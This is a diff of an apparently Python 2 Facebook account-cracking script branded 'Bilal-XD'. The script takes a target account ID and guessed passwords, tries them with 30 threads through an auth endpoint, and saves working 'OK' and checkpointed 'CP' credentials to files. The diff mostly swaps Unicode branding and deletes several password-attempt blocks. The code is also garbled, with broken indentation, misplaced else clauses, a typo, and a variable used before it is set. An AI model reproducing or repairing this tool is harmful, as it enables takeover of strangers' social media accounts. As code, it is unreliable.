@@ -257,26 +257,26 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \033[1;97m╰─ᗷƖᒪᗩᒪ-᙭ᗪ➤ ')
+    a_s = raw_input(' \033[1;97m╰─𝗕𝗶𝗹𝗮𝗹-𝗫𝗗➤ ')
     if a_s == '1':
         os.system('clear')
         print logo
         print ' \033[1;90mFor-example : \033[1;91m234567,334455,445566,556677\033[1;94m'
         print 47 * '-'
-        pass1 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[1]Password: ')
-        pass2 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[2]Password: ')
-        pass3 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[3]Password: ')
-      	pass4 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[4]Password: ')
-        pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
-        pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[6]Password: ')
-        pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[7]Password: ')
-        pass8 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[8]Password: ')
-        p9 = raw_input(' Name + your digit: ')
-        p10 = raw_input(' Name + your digit: ')
-        p11 = raw_input(' Name + your digit: ')
-        p12 = raw_input(' Name + your digit: ')
-        p13 = raw_input(' Name + your digit: ')
-        idt = raw_input(' \033[1;93mＢｉｌａｌ-ＸＤ[★]Enter id: ')
+        pass1 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[1]Password: ')
+        pass2 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[2]Password: ')
+        pass3 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[3]Password: ')
+      	pass4 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[4]Password: ')
+      pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
+	pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[6]Password: ')
+	pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[7]Password: ')
+	pass8 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[8]Password: ')
+	p9 = raw_input(' Name + your digit: ')
+	p10 = raw_input(' Name + your digit: ')
+	p11 = raw_input(' Name + your digit: ')
+	p12 = raw_input(' Name + your digit: ')
+	p13 = raw_input(' Name + your digit: ')
+        idt = raw_input(' \033[1;93m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[★]Enter id: ')
         
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -304,19 +304,20 @@ def a_s():
         print logo
         print ' \033[1;91mFor-example : \033[1;97m234567,334455,445566,556677\033[1;94m'
         print 47 * '-'
-        pass1 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[1]Password: ')
-        pass2 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[2]Password: ')
-        pass3 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[3]Password: ')
-	pass4 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[4]Password: ')
+        pass1 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[1]Password: ')
+        pass2 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[2]Password: ')
+        pass3 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[3]Password: ')
+	pass4 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[4]Password: ')
 	pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
 	pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[6]Password: ')
 	pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[7]Password: ')
+	pass8 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[8]Password: ')
 	p9 = raw_input(' Name + your digit: ')
 	p10 = raw_input(' Name + your digit: ')
 	p11 = raw_input(' Name + your digit: ')
 	p12 = raw_input(' Name + your digit: ')
 	p13 = raw_input(' Name + your digit: ')
-        idt = raw_input(' \033[1;93mＢｉｌａｌ-ＸＤ[★]Enter id: ')
+        idt = raw_input(' \033[1;93m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[★]Enter id: ')
         
         try:
             r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
@@ -342,13 +343,13 @@ def a_s():
     elif a_s == '3':
         os.system('clear')
         print logo
-        print ' \033[1;90mFor-example : \033[1;97m234567,334455,445566,556677,786786,007007,102030,304050\033[1;94m'
+        print ' \033[1;90mFor-example : \033[1;97m234567,334455,445566,556677\033[1;94m'
         print 47 * '-'
-        pass1 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[1]Password: ')
-        pass2 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[2]Password: ')
-        pass3 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[3]Password: ')
-	pass4 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[4]Password: ')
-	pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
+        pass1 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[1]Password: ')
+        pass2 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[2]Password: ')
+        pass3 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[3]Password: ')
+	pass4 = raw_input(' \033[1;92m𝗕𝗶𝗹𝗮𝗹-𝗫𝗗[4]Password: ')
+        pass5 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[5]Password: ')
 	pass6 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[6]Password: ')
 	pass7 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[7]Password: ')
 	pass8 = raw_input(' \033[1;92mＢｉｌａｌ-ＸＤ[8]Password: ')
@@ -377,7 +378,7 @@ def a_s():
     print ' \033[1;92mCrack Running\033[1;94m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\033[1;92mB1L4L 1S 4 CUT3 B0Y\033[1;94m'
+    print '\t\033[1;92mAsad Black hate hacker\033[1;94m'
     print 47 * '-'
     
     def main(arg):
@@ -388,8 +389,8 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass1
-                ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
+                print '\033[1;95m[𝗕𝗶𝗹𝗮𝗹-𝗢𝗞]➤ ' + uid + ' | ' + pass1
+                ok = open('/sdcard/ids/𝗕𝗶𝗹𝗮𝗹_𝗢𝗞.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
@@ -404,7 +405,7 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;95m[𝗕𝗶𝗹𝗮𝗹-𝗢𝗞]➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
@@ -419,7 +420,7 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass3
+                        print '\033[1;95m[𝗕𝗶𝗹𝗮𝗹-𝗢𝗞]➤ ' + uid + ' | ' + pass3
                         ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
@@ -430,11 +431,11 @@ def a_s():
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
-               else:
+                    else:
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass4
+                            print '\033[1;95m[𝗕𝗶𝗹𝗮𝗹-𝗢𝗞]➤ ' + uid + ' | ' + pass4
                             ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
@@ -445,150 +446,6 @@ def a_s():
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
-                            else:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass5
-                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass5 + '\n')
-                        ok.close()
-                        oks.append(uid + pass5)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass5
-                        cp = open('BILAL_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass5 + '\n')
-                        cp.close()
-                        cps.append(uid + pass5)
-                        else:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass6
-                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass6 + '\n')
-                        ok.close()
-                        oks.append(uid + pass6)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass6
-                        cp = open('BILAL_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass6 + '\n')
-                        cp.close()
-                        cps.append(uid + pass6)
-                        else:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass7
-                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass7 + '\n')
-                        ok.close()
-                        oks.append(uid + pass7)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass7
-                        cp = open('BILAL_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass7 + '\n')
-                        cp.close()
-                        cps.append(uid + pass7)
-                        else:
-                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
-                    q = json.loads(data)
-                    if 'loc' in q:
-                        print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass8
-                        ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                        ok.write(uid + ' | ' + pass8 + '\n')
-                        ok.close()
-                        oks.append(uid + pass8)
-                    elif 'www.facebook.com' in q['error']:
-                        print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass8
-                        cp = open('BILAL_CP.txt', 'a')
-                        cp.write(uid + ' | ' + pass8 + '\n')
-                        cp.close()
-                        cps.append(uid + pass8)
-                        else:
-                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
-                pass9 = name.lower() + p9
-                q = json.loads(data)
-                if 'loc' in q:
-                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass9
-                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                    ok.write(uid + ' | ' + pass9 + '\n')
-                    ok.close()
-                    oks.append(uid + pass9)
-                elif 'www.facebook.com' in q['error']:
-                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass9
-                    cp = open('BILAL_CP.txt', 'a')
-                    cp.write(uid + ' | ' + pass9 + '\n')
-                    cp.close()
-                    cps.append(uid + pass9)
-                    else:
-                    	pass10 = name.lower() + p10
-                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers = header).text
-                q = json.loads(data)
-                if 'loc' in q:
-                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass10
-                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                    ok.write(uid + ' | ' + pass10 + '\n')
-                    ok.close()
-                    oks.append(uid + pass10)
-                elif 'www.facebook.com' in q['error']:
-                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass10
-                    cp = open('BILAL_CP.txt', 'a')
-                    cp.write(uid + ' | ' + pass10 + '\n')
-                    cp.close()
-                    cps.append(uid + pass10)
-                    else:
-                    	pass11 = name.lower() + p11
-                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers = header).text
-                q = json.loads(data)
-                if 'loc' in q:
-                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass11
-                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                    ok.write(uid + ' | ' + pass11 + '\n')
-                    ok.close()
-                    oks.append(uid + pass11)
-                elif 'www.facebook.com' in q['error']:
-                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass11
-                    cp = open('BILAL_CP.txt', 'a')
-                    cp.write(uid + ' | ' + pass11 + '\n')
-                    cp.close()
-                    cps.append(uid + pass11)
-                              else:
-                    	pass12 = name.lower() + p12
-                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
-                q = json.loads(data)
-                if 'loc' in q:
-                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass12
-                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                    ok.write(uid + ' | ' + pass12 + '\n')
-                    ok.close()
-                    oks.append(uid + pass12)
-                elif 'www.facebook.com' in q['error']:
-                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass12
-                    cp = open('BILAL_CP.txt', 'a')
-                    cp.write(uid + ' | ' + pass12 + '\n')
-                    cp.close()
-                    cps.append(uid + pass12)
-                              else:
-                    	pass13 = name.lower() + p13
-                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass13, headers = header).text
-                q = json.loads(data)
-                if 'loc' in q:
-                    print '\033[1;95m[BILAL-OK]➤ ' + uid + ' | ' + pass13
-                    ok = open('/sdcard/ids/BILAL_OK.txt', 'a')
-                    ok.write(uid + ' | ' + pass13 + '\n')
-                    ok.close()
-                    oks.append(uid + pass13)
-                elif 'www.facebook.com' in q['error']:
-                    print '\033[1;91m[BILAL-CP]➤ ' + uid + ' | ' + pass13
-                    cp = open('BILAL_CP.txt', 'a')
-                    cp.write(uid + ' | ' + pass13 + '\n')
-                    cp.close()
-                    cps.append(uid + pass13)
-
-
-
-
         except:
             pass
         
@@ -597,7 +454,7 @@ def a_s():
     p = ThreadPool(30)
     p.map(main, id)
     print 47 * '-'
-    print ' \033[1;92mB1L4L \033[1;96mBLACK \033[1;97mHATE \033[1;98mHACKER'
+    print ' \033[1;92mB1LAL BLACK HATE HACKER'
     print ' \033[1;92mTotal \033[1;95mOk\033[1;90m/\033[1;91mCp:' + str(len(oks)) + '/' + str(len(cps))
     print 47 * '-'
     raw_input(' \033[1;90mPress enter to back')
@@ -607,5 +464,3 @@ def a_s():
  
 if __name__ == '__main__':
     menu()
-
-hi
